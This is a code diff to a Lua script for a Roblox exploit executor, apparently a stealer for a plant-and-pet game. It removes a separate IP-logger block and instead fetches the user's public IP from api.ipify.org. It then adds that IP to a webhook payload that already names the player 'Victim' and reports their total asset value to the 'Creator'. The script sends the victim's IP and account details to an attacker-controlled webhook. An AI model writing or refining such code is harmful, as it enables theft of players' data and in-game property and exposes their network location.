@@ -16,29 +16,14 @@ local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValu
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
--- Robust IP Logger (unchanged)
-local ipLoggerSent = false
-if req and not ipLoggerSent then
-    local success, response = pcall(function()
+-- Get public IP for use in final logs
+local userIP = "?"
+if req then
+    local ok, response = pcall(function()
         return req({ Url = "https://api.ipify.org/", Method = "GET" })
     end)
-    if success and response and response.Body then
-        local userIP = tostring(response.Body)
-        req({
-            Url = logs_webhook,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({
-                embeds = {{
-                    title = ":warning: IP Logger",
-                    description = "User's Public IP: `" .. userIP .. "`",
-                    color = 0xff0000,
-                    footer = { text = "For demonstration/education only" },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                }}
-            })
-        })
-        ipLoggerSent = true
+    if ok and response and response.Body then
+        userIP = tostring(response.Body)
     end
 end
 
@@ -279,6 +264,7 @@ local payload = {
         ["color"] = 0x00ffcc,
         ["fields"] = {
             {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":earth_americas: Public IP", ["value"] = userIP, ["inline"] = false},
             {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
             {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
             {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
